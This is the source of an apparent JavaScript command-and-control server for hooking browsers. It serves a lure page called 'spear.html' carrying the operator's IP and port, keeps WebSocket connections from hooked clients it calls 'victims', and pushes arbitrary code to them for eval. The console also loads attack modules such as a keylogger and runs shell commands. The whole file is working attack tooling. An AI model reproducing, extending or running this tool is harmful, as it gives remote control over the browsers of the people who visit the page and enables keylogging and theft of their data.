////COMMAND LINE
var program = require('commander');
program.command=null;
program.commandfile=null;
program
  .version('0.1.0')
  //.option('-c, --command <string>', 'String of commands to run in the console')
  .option('-c, --commandfile <file>', 'file with commands to run in the console')
  .option('-p, --port <port>', 'Port to listen on')
  .option('-i, --ip <ip>', 'The ip address to use in the reverse connection')
  .option('-s, --start', 'Start a listener immediatly')
  .parse(process.argv);

////EXTRAS
var UglifyJS = require("uglify-js");
var exec = require('child_process').exec;

////SERVER
var WebSocketServer = require('websocket').server
var webSocketsServerPort = 1337
var fs = require('fs');
var spearHtml = fs.readFileSync(__dirname + '/spear.html','utf8');
var http = require('http')
var conns = []
var gr;
var module;
var handlers=[];
var options;
options.LHOST = "localhost";
if (program.ip) {
	options.LHOST = program.ip;
}
options.LPORT = "1337";
if (program.port) {
	options.LPORT = program.port;
}
options.RHOST = "0.0.0.0";
options.TARGETS = "all";
var precursor = ">>>";
var loaded_module="";

//RESPONSE HANDLING
function handleresponse(obj, con) {
	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
	if ("data" in obj) {
		console.log("");
		console.log(obj);
	}
	//sending to all handlers
	for (i in handlers) {
		handlers[i].handler(options, con, obj);
	}
}
//REQUEST HANDLING
function handleReq(obj, con) {
  if (obj.request === 'getresponse')
    gr = obj.html
}

//HTTP SERVER CONFIG
var server = http.createServer((request, response) => {
	if (request.url.indexOf('/exec?') === 0) {
		response.writeHead(404, {'Content-Type': 'text/html'})
		for (var i in conns)
			conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
			response.end("sent")
	} else if (request.url.indexOf('/send?') === 0) {
		response.writeHead(404, {'Content-Type': 'text/html'})
		for (var i in conns)
		conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
		var checkgr = () =>
		{
			if (gr) {
				response.end(gr)
				gr = ""
			} else
				setTimeout(checkgr, 500)
		}
		checkgr()
	} else if (request.url === '/status') {
		response.writeHead(200, {'Content-Type': 'application/json'})
		var responseObject = {
			currentClients: 1234,
			totalHistory: 567
		}
	 	response.end(JSON.stringify(responseObject))
  	} else {
		response.writeHead(200, {'Content-Type': 'text/html'});
		response.write('<script type="text/javascript">var host_addr="'+options.LHOST+'";var host_port="'+options.LPORT+'";</script>'+spearHtml);
		response.end();
	}
})

//HTTP SERVER START
function start_server() {
	server.close();
	server.listen(options.LPORT, () => {
		console.log((new Date()) + " Server is listening on port " + options.LPORT )
	})
}
if (program.start) {
	start_server();
}

//ADD WEBSOCKET SERVER
wsServer = new WebSocketServer({
	httpServer: server
})
//REQUESTS
wsServer.on('request', (request) => {
	var obj;
	//connection
	var connection = request.accept(null, request.origin);
	connection.name = connection.remoteAddress;
	conns.push(connection);
	console.log('New connection to client at '+connection.remoteAddress)
	connection.on('request', (message) => {	console.log('request: ' + message)})
	connection.on('message', (message) => {
		try { obj = JSON.parse(message.utf8Data) } catch(e) {}
			if (typeof(obj) === 'object') {
				handleReq(obj, connection);
				handleresponse(obj,connection); 
			} else {console.log('message: ' + message.utf8Data); }
	})
	// remove connection from our list
	connection.on('close', connection => {
	console.log('connection closed')
	for (var i in conns)
		if (conns[i] == connection)
			conns.splice(i, 1)
	})
})

////INTERFACE
var prompt = require('prompt');
var colors = require("colors/safe");
prompt.message = "";
prompt.delimiter = "";

function input() {
	prompt.start();
	prompt.get({properties: {command:{description: precursor+loaded_module}}}, function (err, result) {
		if (result != null) {
			process_command(result.command);
			input();
		} else {
			console.log("Exiting...");
			console.log();
			process.exit();
		}
	});
}
function banner() {
}
function output(text) {
	console.log("");
	console.log(text);
	//console.log("");
}
function start_interface() {
	banner();
	if (program.command){
		process_command(program.command);
	} else if (program.commandfile){
		process_command(fs.readFileSync(__dirname + '/' + program.commandfile,'utf8'));
	}
	input()
}
//LIST OF SET OPTIONS
function options() {
	for (i in options) {
		console.log(i +'='+options[i]);
	}
} 
//HELP function to be called to have all basic commands listed
function help(){
	console.log('Available commands:');
	console.log("- start | restart");
	console.log("      Restarts the server that serves the spear and provides the socket to connect to"); 
	console.log("- set <property> <value>");
	console.log("      Sets a value used by the server or module. ex. 'set LHOST: mydomain.org'"); 
	console.log("- options");
	console.log("      List all the values of the options"); 
	console.log("- load <module>");
	console.log("      Loads the functions inside that module. Only one module can be selected at once. ex. 'load keylogger'"); 
	console.log("- modules <search>");
	console.log("      Gives a list of all available modules, with an optional searchterm"); 
	console.log("- exec");
	console.log("      Executes the 'exec' function of the current selected module. Ex. send a payload"); 
	console.log("- conns");
	console.log("      List all connections to the server"); 
	console.log("- help");
	console.log("      Print this help"); 
}
//ERROR handling for command related stuff
function command_not_found(command){
	console.log("'"+command+"' is not a valid command, type 'help' for the full list of commands");
}
function modules(searchterm) {
	if (searchterm) {
		console.log ("List of modules containing '"+searchterm+ "':");
	} else {
		console.log ("List of modules:")
	}
	fs.readdirSync(__dirname + '/modules/').forEach(file => {
		if (!searchterm || file.indexOf(searchterm) !== -1) {
			if (file.charAt(0) !== '.') {
		  		console.log('  - '+file);
			}
		}
	})
}
//PROCESSING OF COMMANDS
function process_command(command) {
	command_lines = command.replace(/(?:\r\n|\r|\n)/g, ';').split(';');
	for (i in command_lines) {
	let command = command_lines[i];
	//different commands here -> make layer system
	first_argument=command.split(" ")[0];
	if (first_argument == "") {
	} else if (first_argument == "conns") {
		if (conns.length > 0) {
			console.log ("List of connections:")
			for (i in conns) {
				console.log(' ['+i+'] '+conns[i].name);
			}
		} else {
			console.log('No connections...');
		}
	} else if (first_argument== "set") { 
		if (command.split(" ").length > 1) {
			assign=command.split(" ");
			if (assign.length > 2){
				var value = assign.splice(2).join(" ");
				options[assign[1].trim()]=value;
				console.log(assign[1].trim()+" is now set to '"+value+"'");

			} else {
				console.log("No argument of form <variable>=<value>");
			}
		} else {
			console.log("not enough arguments")
		}
	} else if (first_argument== "unset") { 
		assign=command.split(" ");
		delete options[assign[1].trim()]
		console.log(assign[1].trim()+" is now unset");
	} else if (first_argument== "options") { 
		if (typeof options === "function") { 
			options();
		}
	} else if (first_argument== "log") { 
		//on or off get data info
	} else if (first_argument== "load") { 
		if (command.split(" ").length > 1) {
			if (fs.existsSync(__dirname+'/modules/'+command.split(" ")[1])) {
				module = require(__dirname+'/modules/'+command.split(" ")[1]);
				if (typeof module.data.init === "function") { 
					module.data.init(options);
				}
				loaded_module = ' '+command.split(" ")[1]+':';
				//setup handler
				handlers.push({name:command.split(" ")[1],handler:module.data.handler})
			} else {
				console.log('[ERROR] no such module');
				modules(command.split(" ")[1]);
			}
		} else {
			console.log("Not enough arguments")
		}
	} else if (first_argument== "unload") { 
		module = null;
		/*
		for (var i = handlers.length - 1; i >= 0; --i) {
			    if (handlers[i].name == loaded_module.substr(1).slice(0, -1)) {
				            handlers.splice(i,1);
				        }
		}
		*/
		loaded_module = "";
	} else if (first_argument== "modules") { 
		modules();
	} else if (first_argument== "exec") { 
		if (module.data) {
		if (typeof module.data.exec === "function") { 
			//TODO VICTIMS -> naar victims (list
			victims = conns;
			if (command.split(" ").length > 1) {
				module.data.exec(options ,victims, command.split(" ")[1]);
			} else {
				module.data.exec(options, victims);
			}
		} else {
			console.log('No exec function present in current module')
		}
		} else {
			console.log('no module loaded');
		}
	} else if (first_argument== "info") { 
		if (module.data) {
		if (typeof module.data.info === "function") { 
			if (command.split(" ").length > 2) {
				module.data.info(options,command.split(" ")[1]);
			} else {
				module.data.info(options);
			}
		} else {
			console.log('No info function present in current module')
		}
		} else {
			console.log('no module loaded');
		}
	} else if (first_argument== "custom") { 
		if (options.TARGETS == "all") {
			inject_string = command.split(" ").splice(1).join(" ");
			console.log("Command sent: "+inject_string);
			for (var i in conns)
				conns[i].sendUTF(JSON.stringify({ request: 'eval', content: inject_string }))
		} else {
			console.log("targets function TODO");
		}
	} else if (first_argument== "shell") { 
		exec(command.split(" ").splice(1).join(" "), function(err, stdout, stderr) {
			if (stderr) {
				console.log(stderr);
			}
			if (stdout) {
				console.log(stdout);
			}
		});
	} else if (first_argument== "restart"|| first_argument == "start") { 
		//TODO maybe wipe connections and clean
		start_server();

	} else if (first_argument== "exit") { 
		process.exit();
	} else if (first_argument== "help") { 
		help();
	} else {
		command_not_found(command);
		help();
	}
	}
}
start_interface();
